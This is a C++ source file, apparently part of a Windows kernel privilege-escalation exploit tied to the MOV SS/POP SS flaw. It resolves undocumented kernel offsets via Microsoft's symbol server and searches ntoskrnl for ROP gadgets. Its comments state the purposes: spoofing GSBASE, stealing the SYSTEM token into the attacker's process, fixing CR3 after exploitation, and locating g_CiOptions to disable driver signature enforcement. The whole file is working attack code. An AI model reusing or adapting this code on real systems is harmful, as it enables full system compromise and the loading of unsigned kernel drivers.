/*
*	Module Name:
*		symbols.cpp
*
*	Abstract:
*		Implements the dbghelp/symsrv API to retrieve PDB information
*		from public/private symbols, including named symbols and structure
*		types.
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*		Nemanja (Nemi) Mulasmajic <nm@triplefault.io> | http://triplefault.io/
*
*/

#include "stdafx.h"
#include "symbols.hpp"
#include "movss_popss.h"
#include "io.h"
#include "mm.h"

/*
*	Use dbghelp/symsrv to retrieve the PDBs for ntoskrnl.exe and CI.dll.
*	We need undocumented fields.
*/
bool SymFindKernelOffsets()
{
	FSymbols Symbols(SYMOPT_CASE_INSENSITIVE |
		SYMOPT_UNDNAME |
		SYMOPT_DEFERRED_LOADS |
		SYMOPT_IGNORE_NT_SYMPATH |
		SYMOPT_FAIL_CRITICAL_ERRORS |
		SYMOPT_EXACT_SYMBOLS |
		SYMOPT_FAVOR_COMPRESSED |
		SYMOPT_DISABLE_SYMSRV_AUTODETECT |
		SYMOPT_DEBUG);

	// Save the PDBs downloaded from the Microsoft symbol server to your 
	// temporary path.
	wchar_t LocalSymbolCache[MAX_PATH + 1] = { 0 };
	GetTempPathW((RTL_NUMBER_OF(LocalSymbolCache) - 1), LocalSymbolCache);

	std::wstring SymbolPath = L"SRV*";
	SymbolPath.append(LocalSymbolCache);
	SymbolPath.append(L"*http://msdl.microsoft.com/download/symbols");

	pprintf("Initializing symbol handler with path: '%S'.\n", SymbolPath.c_str());

	if (!Symbols.Initialize(SymbolPath.c_str()))
	{
		pprintf("ERROR: Failed to initialize symbol support.\n");
		return false;
	}

	wchar_t SystemDirectory[MAX_PATH + 1] = { 0 };
	GetSystemDirectoryW(SystemDirectory, (RTL_NUMBER_OF(SystemDirectory) - 1));

	pprintf("System directory: %S.\n", SystemDirectory);

	// Load symbols for ntoskrnl.exe.
	wchar_t NtoskrnlPath[MAX_PATH + 1] = { 0 };
	wcscpy_s(NtoskrnlPath, SystemDirectory);
	PathAppendW(NtoskrnlPath, L"ntoskrnl.exe");

	pprintf("Loading symbols for ntoskrnl: %S.\n", NtoskrnlPath);

	auto Ntoskrnl = Symbols.Load(NtoskrnlPath);
	if (!Ntoskrnl)
	{
		pprintf("ERROR: Failed to load symbols for ntoskrnl.\n");
		return false;
	}

	// Find ROP gadgets.
	pprintf("Searching for ROP gadgets...\n");

	if (!SympFindRopGadgets(NtoskrnlPath))
	{
		pprintf("ERROR: Failed to find necessary ROP gadgets in ntoskrnl.\n");
		return false;
	}

	// Find offset to _KPCR.CurrentPrcb. This field needs to be valid when we 
	// use our spoofed GSBASE or we'll bugcheck.
	auto CurrentPrcb = Ntoskrnl->GetType(L"_KPCR", L"CurrentPrcb");
	if (!CurrentPrcb)
	{
		pprintf("ERROR: _KPCR.CurrentPrcb not found.\n");
		return false;
	}

	_CurrentPrcbOffset = CurrentPrcb->Offset;

	pprintf("_KPCR.CurrentPrcb: +0x%llx.\n", _CurrentPrcbOffset);

	// Find offset to _KPCR.Prcb.CurrentThread.
	auto Prcb = Ntoskrnl->GetType(L"_KPCR", L"Prcb");
	if (!Prcb)
	{
		pprintf("ERROR: _KPCR.Prcb not found.\n");
		return false;
	}

	auto CurrentThread = Ntoskrnl->GetType(L"_KPRCB", L"CurrentThread");
	if (!CurrentThread)
	{
		pprintf("ERROR: _KPRCB.CurrentThread not found.\n");
		return false;
	}

	_CurrentThreadOffset = Prcb->Offset + CurrentThread->Offset;

	pprintf("_KPCR.Prcb.CurrentThread: +0x%llx.\n", _CurrentThreadOffset);

	// Find offset to _KTHREAD.ApcState.Process.
	auto ApcState = Ntoskrnl->GetType(L"_KTHREAD", L"ApcState");
	if (!ApcState)
	{
		pprintf("ERROR: _KTHREAD.ApcState not found.\n");
		return false;
	}

	auto Process = Ntoskrnl->GetType(L"_KAPC_STATE", L"Process");
	if (!Process)
	{
		pprintf("ERROR: _KAPC_STATE.Process not found.\n");
		return false;
	}

	_CurrentProcessOffset = ApcState->Offset + Process->Offset;

	pprintf("_KTHREAD.ApcState.Process: +0x%llx.\n", _CurrentProcessOffset);

	// Find offset to _EPROCESS.Token.
	auto Token = Ntoskrnl->GetType(L"_EPROCESS", L"Token");
	if (!Token)
	{
		pprintf("ERROR: _EPROCESS.Token not found.\n");
		return false;
	}

	_ProcessTokenOffset = Token->Offset;

	pprintf("_EPROCESS.Token: +0x%llx.\n", _ProcessTokenOffset);

	std::wstring Mask = Ntoskrnl->ModuleName + L"!*";
	Ntoskrnl->EnumerateSymbols(Mask.c_str(), [](PSYMBOL_INFOW SymInfo, ULONG SymbolSize, PVOID UserContext) -> BOOL
	{
		UNREFERENCED_PARAMETER(SymbolSize);

		if (SymInfo->NameLen && SymInfo->Name)
		{
			if (!_wcsicmp(SymInfo->Name, L"PsInitialSystemProcess"))
			{
				// This is needed for us to steal the system token and use it in our process.
				_PsInitialSystemProcessOffset = (uint32_t)(SymInfo->Address - SymInfo->ModBase);
			}
			else if (!_wcsicmp(SymInfo->Name, L"ExAllocatePoolWithTag"))
			{
				// This is needed for the post-exploit fix-up of CR3.
				_ExAllocatePoolWithTagOffset = (uint32_t)(SymInfo->Address - SymInfo->ModBase);
			}
		}

		return TRUE;
	}, NULL);

	if (!_PsInitialSystemProcessOffset || !_ExAllocatePoolWithTagOffset)
	{
		pprintf("ERROR: Failed to find required symbol information in ntoskrnl.\n");
		return false;
	}

	pprintf("nt!PsInitialSystemProcess: +0x%llx\n", _PsInitialSystemProcessOffset);
	pprintf("nt!ExAllocatePoolWithTag: +0x%llx\n", _ExAllocatePoolWithTagOffset);

	// Load symbols for CI.dll.
	wchar_t CiPath[MAX_PATH + 1] = { 0 };
	wcscpy_s(CiPath, SystemDirectory);
	PathAppendW(CiPath, L"ci.dll");

	pprintf("Loading symbols for CI: %S.\n", CiPath);

	auto Ci = Symbols.Load(CiPath);
	if (!Ci)
	{
		pprintf("ERROR: Failed to load symbols for CI.\n");
		return false;
	}

	Mask = Ci->ModuleName + L"!*";
	Ci->EnumerateSymbols(Mask.c_str(), [](PSYMBOL_INFOW SymInfo, ULONG SymbolSize, PVOID UserContext) -> BOOL
	{
		UNREFERENCED_PARAMETER(SymbolSize);

		if (SymInfo->NameLen && SymInfo->Name)
		{
			if (!_wcsicmp(SymInfo->Name, L"g_CiOptions"))
			{
				// This is needed to disable DSE.
				_g_CiOptionsOffset = (uint32_t)(SymInfo->Address - SymInfo->ModBase);
				return FALSE;
			}
		}

		return TRUE;
	}, NULL);

	if (!_g_CiOptionsOffset)
	{
		pprintf("ERROR: Failed to find required symbol information in CI.\n");
		return false;
	}

	pprintf("CI!g_CiOptions: +0x%llx\n", _g_CiOptionsOffset);

	return true;
}

/*
*	Find the required ROP gadgets for the exploit.
*/
bool SympFindRopGadgets(_In_ PWCHAR NtoskrnlPath)
{
	bool Status = false;

	PVOID Mapping = NULL;
	size_t MappingSize = 0;
	if (!IoMapImage(NtoskrnlPath, Mapping, MappingSize))
	{
		pprintf("ERROR: Failed to map ntoskrnl into memory.\n");
		return false;
	}

	pprintf("ntoskrnl mapped into memory: 0x%p (0x%zx).\n", Mapping, MappingSize);

	size_t TextSize = 0;
	PVOID TextSection = IoGetImageSection(Mapping, ".text", TextSize);
	if (!TextSection)
	{
		pprintf("ERROR: Failed to find the .text section in ntoskrnl.\n");
		goto Cleanup;
	}

	pprintf("Searching for ROP gadgets in .text: 0x%p (0x%zx).\n", TextSection, TextSize);

	PVOID Gadget1Location, Gadget2Location, Gadget3Location;

	Gadget1Location = MmFindBytes((uint8_t*)TextSection, TextSize, _Gadget1, sizeof(_Gadget1));
	if (!Gadget1Location)
	{
		pprintf("ERROR: Failed to find ROP gadget 1 in ntoskrnl.\n");
		goto Cleanup;
	}

	_Gadget1Offset = ((uintptr_t)Gadget1Location - (uintptr_t)Mapping);

	Gadget2Location = MmFindBytes((uint8_t*)TextSection, TextSize, _Gadget2, sizeof(_Gadget2));
	if (!Gadget2Location)
	{
		pprintf("ERROR: Failed to find ROP gadget 2 in ntoskrnl.\n");
		goto Cleanup;
	}

	_Gadget2Offset = ((uintptr_t)Gadget2Location - (uintptr_t)Mapping);

	Gadget3Location = MmFindBytes((uint8_t*)TextSection, TextSize, _Gadget3, sizeof(_Gadget3));
	if (!Gadget3Location)
	{
		pprintf("ERROR: Failed to find ROP gadget 3 in ntoskrnl.\n");
		goto Cleanup;
	}

	_Gadget3Offset = ((uintptr_t)Gadget3Location - (uintptr_t)Mapping);

	pprintf("ROP gadgets: +0x%I64x, +0x%I64x, +0x%I64x.\n", _Gadget1Offset, _Gadget2Offset, _Gadget3Offset);

	Status = true;

Cleanup:

	if (Mapping)
	{
		UnmapViewOfFile(Mapping);
		Mapping = NULL;
	}

	return Status;
}